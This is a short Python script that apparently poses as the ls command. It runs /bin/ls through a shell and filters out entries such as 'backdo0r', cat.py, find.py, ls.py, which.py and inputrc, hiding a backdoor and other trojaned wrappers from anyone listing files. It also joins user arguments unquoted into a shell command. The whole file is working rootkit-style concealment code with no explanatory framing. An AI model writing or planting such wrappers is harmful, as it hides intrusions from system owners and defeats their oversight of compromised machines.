#!/usr/bin/python3

import sys
import os


sys.argv[0]="/bin/ls"
os.system(" ".join(sys.argv) + "|" + 'grep -v "cat.py\\|find.py\\|ls.py\\|backdo0r\\|which.py\\|inputrc"')